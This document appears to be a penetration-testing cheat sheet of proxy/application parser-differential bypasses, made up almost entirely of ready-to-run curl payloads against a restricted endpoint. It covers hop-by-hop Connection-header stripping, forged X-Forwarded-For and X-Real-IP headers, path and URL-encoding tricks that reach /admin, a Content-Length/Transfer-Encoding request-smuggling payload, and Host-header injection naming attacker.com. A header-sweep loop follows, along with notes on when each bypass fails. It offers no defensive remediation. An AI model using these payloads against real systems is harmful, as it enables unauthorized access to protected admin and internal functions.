# Evasion — the parser-differential bypasses and normalization tricks

The bypasses — the normalization boundaries and the header strips.

---

## 1. The hop-by-hop bypass — the Connection-header strip

```bash
# naming the proxy's own header in Connection — the proxy strips it
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Real-IP'
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-For'
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Host'
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Internal'
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Admin'
```

## 2. The client-supplied bypass — a forged proxy header

```bash
# a client-supplied proxy header — the app trusts it
curl "$BASE/api/restricted" -H 'X-Real-IP: 127.0.0.1'
curl "$BASE/api/restricted" -H 'X-Forwarded-For: 127.0.0.1'
curl "$BASE/api/restricted" -H 'X-Internal: true'
curl "$BASE/api/restricted" -H 'X-Admin: true'
```

## 3. The path-normalization bypass — a route confusion

```bash
# a path the proxy and the app normalize differently
curl "$BASE/static/../admin"
curl "$BASE/%2e%2e/admin"
curl "$BASE/static/%2e%2e/admin"
curl "$BASE/%252e%252e/admin"
curl "$BASE/Page"
curl "$BASE/page//admin"
```

## 4. The header-name normalization — a case/whitespace difference

```bash
# a header name the proxy and the app normalize differently
curl "$BASE/api/restricted" -H 'X-Real-Ip: 127.0.0.1'   # a case difference
curl "$BASE/api/restricted" -H 'X-Real-IP : 127.0.0.1'   # a whitespace difference
curl "$BASE/api/restricted" -H 'X-Real_IP: 127.0.0.1'   # an underscore difference
```

## 5. The content-length/transfer-encoding boundary — a desync

```bash
# a CL/TE differential — a request-smuggling boundary (a different class)
curl "$BASE/api" -H 'Content-Length: 10' -H 'Transfer-Encoding: chunked' -d '0\r\n\r\nGET /admin'
```

## 6. The structured-field differential — a Host/Forwarded split

```bash
# a Host the proxy and the app normalize differently
curl "$BASE/page" -H 'Host: target.com' -H 'X-Forwarded-Host: attacker.com'
curl "$BASE/page" -H 'Host: attacker.com'   # a rewritten host
```

## 7. The encoding normalization — a URL-decoding boundary

```bash
# an encoded path the proxy and the app decode differently
curl "$BASE/%61dmin"   # an encoded 'a' — a case/encoding boundary
curl "$BASE/%2fadmin"  # an encoded '/'
curl "$BASE/%252fadmin" # a doubly-encoded '/'
```

## 8. The header-strip normalization — a stripped-by-proxy header

```text
a proxy that strips a client-supplied proxy header → the client-
supplied bypass fails → the hop-by-hop bypass is the remaining vector.
a proxy that verifies the header it added → a client-supplied header
is rejected → the client-supplied bypass fails.
```

## 9. The proxy-chain normalization — a multi-proxy difference

```text
a multi-proxy chain — an edge + an origin proxy — a header each
strips differently — a chained normalization boundary.
```

## 10. The evasion's falsifier — when the surface is dead

```text
the card's falsifier: 'both forms are rejected, so the trust check
does not depend on that header' — the header isn't the trust check's
input → a different class.
a proxy that doesn't strip its own header → the hop-by-hop bypass
fails → a different class.
```

## 11. The evasion's sweep — the normalization boundary

```bash
# the header-strip sweep — which headers the proxy strips
for h in 'X-Real-IP' 'X-Forwarded-For' 'X-Forwarded-Host' 'X-Internal' 'X-Admin' 'X-Original-URL' 'X-Rewrite-URL' 'X-Forwarded-Scheme' 'X-Forwarded-Proto'; do
  curl "$BASE/api/restricted" -H "Connection: keep-alive, $h"
done
```

## 12. The evasion's falsifier — a proxy that doesn't strip

```text
a proxy that doesn't honor Connection's strip → the header passes
through → the app's check reads it → the bypass fails → a different
class.
```
